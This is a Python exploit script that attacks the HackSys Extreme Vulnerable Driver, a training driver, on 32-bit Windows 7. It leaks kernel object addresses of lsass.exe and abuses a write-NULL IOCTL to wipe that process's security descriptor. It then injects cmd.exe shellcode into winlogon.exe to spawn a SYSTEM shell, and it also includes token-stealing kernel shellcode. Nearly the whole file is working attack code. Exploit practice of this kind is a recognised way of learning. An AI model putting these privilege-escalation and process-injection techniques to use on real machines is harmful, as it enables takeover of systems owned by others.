# -*- coding: utf-8 -*-
import sys
import random
import binascii
import struct
import os
import subprocess
import ctypes 
import json 

from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Constants.
ULONG_PTR = PVOID = LPVOID
QWORD = c_ulonglong
CHAR = c_char
NTSTATUS = DWORD
NULL = 0x0
SystemExtendedHandleInformation = 64
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_SUCCESS = 0
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
TH32CS_SNAPPROCESS = 0x02

# Function signature helpers.
ntdll.NtQuerySystemInformation.argtypes = [DWORD, PVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
 
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class PROCESSENTRY32(Structure):
    """Describes an entry from a list of the processes residing in the system
       address space when a snapshot was taken."""
    _fields_ = [ ( 'dwSize' , DWORD ) ,
                 ( 'cntUsage' , DWORD) ,
                 ( 'th32ProcessID' , DWORD) ,
                 ( 'th32DefaultHeapID' , POINTER(ULONG)) ,
                 ( 'th32ModuleID' , DWORD) ,
                 ( 'cntThreads' , DWORD) ,
                 ( 'th32ParentProcessID' , DWORD) ,
                 ( 'pcPriClassBase' , LONG) ,
                 ( 'dwFlags' , DWORD) ,
                 ( 'szExeFile' , CHAR * MAX_PATH ) 
    ]

# -----------------------------------------------------------------------------
# exploit functions
#------------------------------------------------------------------------------
def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """

    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """Format GetLastError"""
    
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")
    

def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """

    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
        

def _ret_shellcode_buffer():
    """ Payload memory allocation in user-land """

    shellcode = bytearray(
        #---[Debug]
        "\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad		
        "\xC3"                          # ret
    )

    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(payload_ptr, payload_len, code):
    """ Interacting with the driver """
    
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Recreate CTL_CODE macro to generate driver IOCTL 
    ctl_code = (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )

    # Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return kernel32.CloseHandle(handle)
    

def getPidByName(process_name):
    """ Get Process Pid by process_name """
    
    pid = None
    count = 0
    try:
        hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe32 = PROCESSENTRY32()
        pe32.dwSize = sizeof(PROCESSENTRY32)
        ret = kernel32.Process32First(hProcessSnap , byref(pe32))
        while ret:
            if pe32.szExeFile == LPSTR(process_name).value:
                pid = pe32.th32ProcessID
                count += 1
            ret = kernel32.Process32Next(hProcessSnap, byref(pe32))
        kernel32.CloseHandle (hProcessSnap)
    
    except Exception, e:
        debug_print(str(e))
    
    if not pid:
        debug_print("Could not find %s PID" % process_name)
    
    return pid

# --------------------------------------------------------------------------------------------------------------------
# https://www.programcreek.com/python/?code=abatchy17%2FWindowsExploits%2FWindowsExploits-master%2FMS14-058%2F37064.py
#---------------------------------------------------------------------------------------------------------------------
def get_handles(_pid):
    """Return all the open handles in the system"""

    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD (sizeof (system_handle_information))
    while True:
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            byref(system_handle_information),
            size,
            byref(size)
        )

        if result == STATUS_SUCCESS:
            break

        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)

        else:
            raise x_file_handles("NtQuerySystemInformation", hex(result))

    pHandles = cast(
        system_handle_information.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
                system_handle_information.NumberOfHandles)
    )

    content = []
    # handle.UniqueProcessId, handle.HandleValue, handle.Object 
    count = 0
    for handle in pHandles.contents:
        if handle.UniqueProcessId == _pid:
            #if "0x85" <= hex(handle.Object)[:4] <= "0x87":
            if hex(handle.Object)[:4] == "0x87":
                #if handle.Object == 0x86cec490: # PROCESS 86cec490  SessionId: 0  Cid: 017c    Peb: 7ffd5000  ParentCid: 0168
                                                # DirBase: be6e2060  ObjectTable: 909b8678  HandleCount: 470.
                                                # Image: winlogon.exe
                content.append(handle.Object)
                print("\t|" + str(handle.UniqueProcessId) + ":" + str(handle.HandleValue) + ":" + str(hex(handle.Object)))
                count += 1

    print("\n[!] [%i] Leaked Pointer found!" % count)

    return content


def inject_shellcode(winlogon_pid):
    """ Inject CMD/x86 shellcode inside [ winlogon.exe] """ 
        
    # Get  winlogon.exe pid
    pid = winlogon_pid

    # Get a handle to the winprinton process we are injecting into 
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not hProcess:
        debug_print("\t[-] Couldn't acquire a handle to PID: %s" % pid)
        sys.exit()

    debug_print("\n\t[+] Obtained handle [0x%x] for the winlogon.exe process" % hProcess)
    
    # Creating shellcode buffer to inject into the host process
    # https://packetstormsecurity.com/files/142572/Microsoft-Windows-32-bit-64-bit-cmd.exe-Shellcode.html
    SHELLCODE = (
        "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
        "\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
        "\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
        "\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
        "\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
        "\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
        "\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
        "\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
        "\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
        "\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65"
        "\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
        "\x51\xff\xd6"
    )

    sh = create_string_buffer(SHELLCODE, len(SHELLCODE))
    code_size = len(SHELLCODE)    
    
    # Allocate some space for the shellcode (in the program memory)
    sh_address = kernel32.VirtualAllocEx(hProcess, 0, code_size, VIRTUAL_MEM, 
                                         PAGE_EXECUTE_READWRITE)
    if not sh_address:
        debug_print("\t[-] Could not allocate shellcode in the remote process")
        getLastError()
        sys.exit()
        
    debug_print("\t[+] Allocated memory at address 0x%x" % sh_address)

    # Inject shellcode in to winlogon.exe process space
    written = LPVOID(0)
    shellcode = DWORD(sh_address)
    dwStatus = kernel32.WriteProcessMemory(hProcess, shellcode, sh, code_size, 
                                            byref(written))
    if not dwStatus:
        debug_print("\t[-] Could not write shellcode into winlogon.exe")
        getLastError()
        sys.exit()
        
    debug_print("\t[+] Injected %d bytes of shellcode to 0x%x" % (written.value, sh_address))

    # Now we create the remote thread and point its entry routine to be head of 
    # our shellcode
    thread_id = HANDLE(0)
    if not kernel32.CreateRemoteThread(hProcess, 0, 0, sh_address, 0, 0, 
                                        byref(thread_id)):
        debug_print("\t[-] Failed to inject shellcode into winlogon.exe")
        getLastError()
        sys.exit()

    debug_print("\t[+] Remote thread  0x%x created" % thread_id.value)
    debug_print("\t[+] Spawning SYSTEM shell...")
    # Kill python process to kill the window and avoid BSODs
    #os.kill(os.getpid(), signal.SIGABRT)

    debug_print("\n\t\t[*] Remote thread created with a thread ID of: [%x]" % thread_id.value)
    debug_print("\t\t[+] ***BOOM!!")

def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation

    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))
    """
    3: kd> !process 0 0 lsass.exe
        PROCESS [87662d40]  SessionId: 1  Cid: 0214    Peb: 7ffd9000  ParentCid: 01ac
        DirBase: be6e20e0  ObjectTable: 9aa8a008  HandleCount: 116.
        Image: lsass.exe

    3: kd> dps 87662d40-4
        87662d3c  8c005e1f  => OVERFLOW HERE WITH [0x00000000] 
        87662d40  00260003     AND GET ALL PERMISSIONS OF [lsass.exe] process W/ WHATAEVER USER
        87662d44  00000001
        87662d48  87662d48
        87662d4c  87662d48
        87662d50  87662d50
        87662d54  87662d50
        87662d58  be6e20e0
        87662d5c  00000000
        87662d60  00000000

    3: kd> !object 87662d40  
        Object: 87662d40  Type: (85611d58) Process
        ObjectHeader: [87662d28] (new version) =>  [dt nt!_OBJECT_HEADER 87662d28]
        HandleCount: 10  PointerCount: 106

    3: kd> dt nt!_OBJECT_HEADER 87662d28 
        +0x000 PointerCount     : 0n106
        +0x004 HandleCount      : 0n10
        +0x004 NextToFree       : 0x0000000a Void
        +0x008 Lock             : _EX_PUSH_LOCK
        +0x00c TypeIndex        : 0x7 ''
        +0x00d TraceFlags       : 0 ''
        +0x00e InfoMask         : 0x8 ''
        +0x00f Flags            : 0 ''
        +0x010 ObjectCreateInfo : 0x82b44cc0 _OBJECT_CREATE_INFORMATION
        +0x010 QuotaBlockCharged : 0x82b44cc0 Void
        +0x014 SecurityDescriptor : 0x8c005e1d Void 
        +0x018 Body             : _QUAD

    3: kd> !sd (0x8c005e1f - 0x7) => [SecurityDescription from lsass.exe process]
        ->Revision: 0x1
        ->Sbz1    : 0x0
        ->Control : 0x8814
                    SE_DACL_PRESENT
                    SE_SACL_PRESENT
                    SE_SACL_AUTO_INHERITED
                    SE_SELF_RELATIVE
        ->Owner   : S-1-5-32-544
        ->Group   : S-1-5-18
        ->Dacl    : 
        ->Dacl    : ->AclRevision: 0x2
        ->Dacl    : ->Sbz1       : 0x0
        ->Dacl    : ->AclSize    : 0x3c
        ->Dacl    : ->AceCount   : 0x2
        ->Dacl    : ->Sbz2       : 0x0
        ->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
        ->Dacl    : ->Ace[0]: ->AceFlags: 0x0
        ->Dacl    : ->Ace[0]: ->AceSize: 0x14
        ->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
        ->Dacl    : ->Ace[0]: ->SID: S-1-5-18

        ->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
        ->Dacl    : ->Ace[1]: ->AceFlags: 0x0
        ->Dacl    : ->Ace[1]: ->AceSize: 0x18
        ->Dacl    : ->Ace[1]: ->Mask : 0x00121411
        ->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544

        ->Sacl    : 
        ->Sacl    : ->AclRevision: 0x2
        ->Sacl    : ->Sbz1       : 0x0
        ->Sacl    : ->AclSize    : 0x1c
        ->Sacl    : ->AceCount   : 0x1
        ->Sacl    : ->Sbz2       : 0x0
        ->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
        ->Sacl    : ->Ace[0]: ->AceFlags: 0x0
        ->Sacl    : ->Ace[0]: ->AceSize: 0x14
        ->Sacl    : ->Ace[0]: ->Mask : 0x00000003
        ->Sacl    : ->Ace[0]: ->SID: S-1-16-16384
    """
    
    lsass_pid = getPidByName("lsass.exe")
    debug_print("\n[!] lsass.exe PID: 0x%x\n" % lsass_pid)
    
    leaked_objects = get_handles(lsass_pid) # return lsass.exe handles (nt!_EPROCESS)
    
    #if leaked_objects:
        #debug_print("\n[+] lsass.exe nt!_EPROCESS address leaked!!: [0x%x]" % leaked_objects)
    
    for leak_obj in leaked_objects:

        SecurityDescription = leak_obj - 4 # nullify SecurityDescription located at [_EPROCESS - 4]
        debug_print("\t\t[*] Address of SecurityDescription to be nullify: [0x%x]" % SecurityDescription)
        
        payload = struct.pack("<L", SecurityDescription)
        payload_ptr = id(payload) + 0x14
        payload_len = len(payload)
       
        # send custom payload
        _send_payload(
            payload_ptr,
            payload_len,
            code
        )

    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    winlogon_pid = getPidByName("winlogon.exe")
    return inject_shellcode(winlogon_pid) # get SYSTEM shell

if __name__ == "__main__":
    """
    REFERENCES
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h
        https://github.com/daem0nc0re/HEVD-CSharpKernelPwn/blob/master/HEVD_Win7x86/WriteNull/Program.cs
        http://bprint.rewolf.pl/bprint/?p=1683
        https://github.com/ZecOps/CVE-2020-0796-LPE-POC/blob/master/poc.py 
        https://www.programcreek.com/python/?code=abatchy17%2FWindowsExploits%2FWindowsExploits-master%2FMS14-058%2F37064.py
        https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/windows-debugging-and-exploiting-part-4-ntquerysysteminformation/ 

    IOCTL to trigger TypeConfusion in win7 x86
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h

    Usefull WinDBG commands:
        .sympath c:\symbols;c:\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        .load grep
        bp HEVD!TriggerWriteNULL
        bp HEVD!TriggerWriteNULL+0x4c
        g
    """
    code = 0x811 # HEVD_IOCTL_WRITE_NULL - IOCTL(0x811)
    _exploit(code)
